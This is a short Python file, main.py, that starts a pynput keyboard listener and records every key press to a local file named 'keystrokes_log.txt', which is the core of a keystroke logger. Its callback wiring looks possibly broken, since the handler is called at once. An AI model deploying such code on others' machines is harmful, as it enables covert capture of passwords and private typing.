# main.py
from pynput import keyboard
from keypresses_base import on_key_press

log_file = 'keystrokes_log.txt'  # Define the log_file variable

def main():
    with keyboard.Listener(on_press=on_key_press(log_file)) as listener:  # Pass log_file as an argument
        listener.join()

if __name__ == '__main__':
    main()
